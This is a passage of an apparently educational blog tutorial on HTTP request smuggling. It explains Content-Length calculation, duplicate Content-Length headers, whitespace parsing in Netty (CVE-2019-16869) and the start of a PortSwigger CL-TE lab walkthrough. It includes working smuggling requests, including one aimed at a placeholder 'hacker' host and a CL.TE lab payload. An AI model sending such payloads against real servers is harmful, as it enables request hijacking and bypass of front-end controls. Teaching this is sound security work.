class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line"><span class="hljs-attribute">Host</span>: example.com\r\n</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 41\r\n</span><br><span class="line">\r\n</span><br><span class="line">GET /secret HTTP/1.1\r\n</span><br><span class="line"><span class="hljs-attribute">Host</span>: example.com\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></tbody></table></figure><p></p><p>When the Front server processes this request, it will forward the above request to the Backend server as a complete request, and the Backend service will treat this request as two requests when processing this server.</p><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line"><span class="hljs-attribute">Host</span>: example.com\r\n</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 41\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></tbody></table></figure><p></p><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /secret HTTP/1.1\r\n</span><br><span class="line"><span class="hljs-attribute">Host</span>: example.com\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></tbody></table></figure><p></p><p>In this way, we can successfully perform HTTP Smuggling. From this example, it is not difficult to see that if there is a HTTP Smuggling vulnerability in the scene, then the Content-Length data becomes extra important because it affects us. Whether the attack was successful and whether our HTTP request was successfully embedded in an HTTP request.</p><p>The calculation method here is similar to the previous.</p><p></p><figure class="highlight http hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /secret HTTP/1.1\r\n--&gt;"GET /secret HTTP/1.1" 20 characters in total, plus 22 characters in CRLF</span><br><span class="line"><span class="hljs-attribute">Host</span>: example.com\r\n--&gt;"Host: example.com" 17 characters in total, plus 19 characters in CRLF</span><br></pre></td></tr></tbody></table></figure><p></p><p>22 + 19 = 41 Bytes.</p><h3 id="Two-Identical-Fields-CL"><a href="#Two-Identical-Fields-CL" class="headerlink" title="Two Identical Fields - CL"></a>Two Identical Fields - CL</h3><p>Here we take Content-Length as an example. According to <a href="https://tools.ietf.org/html/rfc7230#section-3.3.2" target="_blank" rel="noopener">RFC7230 section 3.3.2</a>:</p><blockquote><p>If a message is received that has multiple Content-Length header fields with field-values consisting of the same decimal value, or a single Content-Length header field with a field value containing a list of identical decimal values (e.g., “Content-Length: 42, 42”), indicating that duplicate Content-Length header fields have been generated or combined by an upstream message processor, then the recipient MUST either reject the message as invalid or replace the duplicated field-values with a single valid Content-Length field containing that decimal value prior to determining the message body length or forwarding the message.</p></blockquote><p>And in the <a href="https://tools.ietf.org/html/rfc7230#section-3.3.3" target="_blank" rel="noopener">RFC 7230 section 3.3.3</a>  also mention this:</p><blockquote><p>If a message is received without Transfer-Encoding and with either multiple Content-Length header fields having differing field-values or a single Content-Length header field having an invalid value, then the message framing is invalid and the recipient MUST treat it as an unrecoverable error. If this is a request message, the server MUST respond with a 400 (Bad Request) status code and then close the connection.</p></blockquote><p>The RFC also has a relatively clear specification for this situation, but let’s assume here a relatively simple example. We send the following request:</p><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /suzann.html HTTP/1.1\r\n</span><br><span class="line"><span class="hljs-attribute">Host</span>: example.com\r\n</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 0\r\n</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 46\r\n</span><br><span class="line">\r\n</span><br><span class="line">GET /walter.html HTTP/1.1\r\n</span><br><span class="line"><span class="hljs-attribute">Host</span>: example.com\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></tbody></table></figure><p></p><p>Here, we assume that the Front server uses the second Content-Length as the parsing standard, discarding the first Content-Length field or doing nothing to the first or anything else, assuming it only processes the second Content-Length field; we are assuming that the Backend server uses the first Content-Length field as the parsing standard, and ignore the second.</p><p>This is equivalent to injecting another HTTP request into the HTTP request. If the entire scenario looks like ours, there is an HTTP Smuggling attack.</p><p>For example, if the server uses the first Content-Length as the parsing standard, two HTTP requests will appear in the parsing. If the second is used as the parsing standard, it will be considered that there is only one HTTP request.</p><h3 id="Optional-WhiteSpace"><a href="#Optional-WhiteSpace" class="headerlink" title="Optional WhiteSpace"></a>Optional WhiteSpace</h3><p>RFC7320 describes the header field like this:</p><blockquote><p>3.2.  Header Fields</p><p>Each header field consists of a case-insensitive field name followed<br>by a colon (“:”), optional leading whitespace, the field value, and<br>optional trailing whitespace.</p><p></p><figure class="highlight abnf hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">header-field</span>   = field-name <span class="hljs-string">":"</span> OWS field-value OWS</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">field-name</span>     = token</span><br><span class="line"><span class="hljs-attribute">field-value</span>    = *( field-content / obs-fold )</span><br><span class="line"><span class="hljs-attribute">field-content</span>  = field-vchar [ <span class="hljs-number">1</span>*( <span class="hljs-keyword">SP</span> / <span class="hljs-keyword">HTAB</span> ) field-vchar ]</span><br><span class="line"><span class="hljs-attribute">field-vchar</span>    = <span class="hljs-keyword">VCHAR</span> / obs-text</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">obs-fold</span>       = <span class="hljs-keyword">CRLF</span> <span class="hljs-number">1</span>*( <span class="hljs-keyword">SP</span> / <span class="hljs-keyword">HTAB</span> )</span><br><span class="line">               <span class="hljs-comment">; obsolete line folding</span></span><br><span class="line">               <span class="hljs-comment">; see Section 3.2.4</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>The field-name token labels the corresponding field-value as having<br>the semantics defined by that header field.  For example, the Date<br>header field is defined in Section 7.1.1.2 of [RFC7231] as containing<br>the origination timestamp for the message in which it appears.</p></blockquote><p>In particular, the first sentence indicates that the field should be immediately followed by <code>:</code> colon, then OWS (Optional WhiteSpace) optional space, then field value, and finally OWS optional space.</p><p>What’s wrong with this? Obviously, if there is middleware that does not strictly follow the RFC standard for this implementation, HTTP Smuggling attacks will also occur.</p><p>A typical example is CVE-2019-16869. This CVE was discovered by OPPO Meridian Internet Security Lab. It is about HTTP Smuggling vulnerability in Netty middleware.</p><p>Prior to Netty 4.1.42.Final, the processing of Header headers was using [splitHeader](<a href="https://github.com/netty/netty/blob/netty-4.1.41.Final/codec-http/src/main/" target="_blank" rel="noopener">https://github.com/netty/netty/blob/netty-4.1.41.Final/codec-http/src/main/</a> java / io / netty / handler / codec / http / HttpObjectDecoder.java) method, where the key code is as follows:</p><p></p><figure class="highlight java hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">for</span> (nameEnd = nameStart; nameEnd &lt; length; nameEnd ++) {</span><br><span class="line">  <span class="hljs-keyword">char</span> ch = sb.charAt(nameEnd);</span><br><span class="line">  <span class="hljs-keyword">if</span> (ch == <span class="hljs-string">':'</span> || Character.isWhitespace(ch)) {</span><br><span class="line">    <span class="hljs-keyword">break</span>;</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>We don’t need to know much about other codes. Here we can know that white space is treated the same as <code>:</code> colon, that is, if there is a space, the field name before <code>:</code> will be processed normally and will not be thrown error or other operations. This is inconsistent with the specifications of the RFC standard, and parsing differences will occur.</p><p>@ Bi3g0 built a clearer schematic of the vulnerability:</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@masterhttps://user-images.githubusercontent.com/18691823/65211134-3e03cd00-dad0-11e9-94a5-b9f04ea18f38.png" alt=""></p><p>The example used here is to use ELB as the front server and Netty as the backend server. We send the following request:</p><p></p><figure class="highlight http hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/getusers</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: www.backend.com</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 64</span><br><span class="line">Transfer-Encoding : chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">0</span></span><br><span class="line"><span class="hljs-attribute"></span></span><br><span class="line">GET /hacker HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: www.hacker.com</span><br><span class="line"><span class="hljs-attribute">hacker</span>: hacker</span><br></pre></td></tr></tbody></table></figure><p></p><p>ELB will ignore the Transfer-Encoding field, because there is a space between the colon and the colon. It does not comply with the RFC standard. It will use Content-Length as the parsing standard, so it will consider the above request as a complete request, and then throw it to the Backend server Netty. Netty will parse Transfer-Encoding first. Even if this field does not comply with the RFC standard, but because its implementation is not strict, it will split this request into two because it parses Transfer-Encoding first. </p><p></p><figure class="highlight http hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/getusers</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: www.backend.com</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 64</span><br><span class="line">Transfer-Encoding : chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">0</span></span><br></pre></td></tr></tbody></table></figure><p></p><p></p><figure class="highlight http hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">GET</span> <span class="hljs-string">/hacker</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: www.hacker.com</span><br><span class="line"><span class="hljs-attribute">hacker</span>: hacker</span><br></pre></td></tr></tbody></table></figure><p></p><p>This result in HTTP smuggling.</p><p>Netty fixed this vulnerability in 4.1.42 Final: <a href="https://github.com/netty/netty/pull/9585" target="_blank" rel="noopener">Correctly handle whitespaces in HTTP header names as defined by RFC72 …</a></p><p>When we send a header request with a space between field name and colon,  netty returns 400 correctly.</p><h3 id="CL-TE"><a href="#CL-TE" class="headerlink" title="CL-TE"></a>CL-TE</h3><p>In the next few attack methods, we can use some Labs provided by @portswigger to practice for us to deepen our understanding. <a href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">Labs-HTTP request smuggling</a></p><p>Remember to cancel BurpSuite’s automatic update Content-Length function before doing it.</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/http-smuggling/20200520135762.jpg" alt=""></p><p>First let’s look at the situation of CL-TE: <a href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te" target="_blank" rel="noopener">Lab: HTTP request smuggling, basic CL.TE vulnerability</a></p><blockquote><p>This lab involves a front-end and back-end server, and the front-end server doesn’t support chunked encoding. The front-end server rejects requests that aren’t using the GET or POST method.</p><p>To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST.</p></blockquote><p>According to the chall, we only need to let the Backend server receive the GPOST method, and the scenario clearly tells us that it is a CL-TE scenario.</p><p></p><figure class="highlight http hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: ac8f1fae1e6cd77b8073213100b500d6.web-security-academy.net</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 6</span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">0</span></span><br><span class="line"><span class="hljs-attribute"></span></span><br><span class="line"><span class="hljs-attribute">G</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>We can send above requests twice.</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/http-smuggling/20200520137370.jpg" alt=""></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/http-smuggling/20200520138381.jpg" alt=""></p><p>We can make the second method to construct the HTTP method of GPOST. For details, we can follow this flowchart to see:</p><p></p><figure class="highlight gherkin hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 